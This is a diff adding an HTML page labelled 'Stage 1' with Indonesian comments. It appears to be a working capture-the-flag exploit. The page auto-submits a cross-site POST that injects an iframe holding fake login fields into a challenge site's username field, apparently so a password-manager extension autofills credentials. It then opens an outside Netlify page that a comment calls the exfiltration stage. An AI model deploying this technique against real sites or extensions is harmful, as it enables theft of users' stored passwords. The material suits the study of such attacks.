@@ -1,0 +1,38 @@
+<!doctype html>
+<html>
+  <body>
+    <h1>Stage 1</h1>
+    <p style="font-size: 100px;"></p>
+    <script>
+      // 1. Buat form yang POST ke main app (login page)
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = 'https://infopass-web.challs2.infobahnc.tf/';
+      form.target = '_blank';  // buka di tab baru, biar extension jalan di sana
+
+      const usernameField = document.createElement('input');
+      usernameField.name = 'username';
+
+      // Username berisi iframe srcdoc yang akan dirender di halaman main
+      usernameField.value = `<iframe srcdoc='<input name="username"><input type="password">'></iframe>`;
+
+      form.appendChild(usernameField);
+
+      const passwordField = document.createElement('input');
+      passwordField.type = 'password';
+      passwordField.name = 'password';
+      passwordField.value = 'abc';
+      form.appendChild(passwordField);
+
+      document.body.appendChild(form);
+
+      // 2. Submit form ke infopass-web (bot akan login dengan payload ini)
+      form.submit();
+
+      // 3. Setelah beberapa detik, buka Y.html (exfil stage)
+      setTimeout(() => {
+        window.open('https://gleaming-pastelito-22bfc1.netlify.app', '_blank');
+      }, 3000);
+    </script>
+  </body>
+</html>
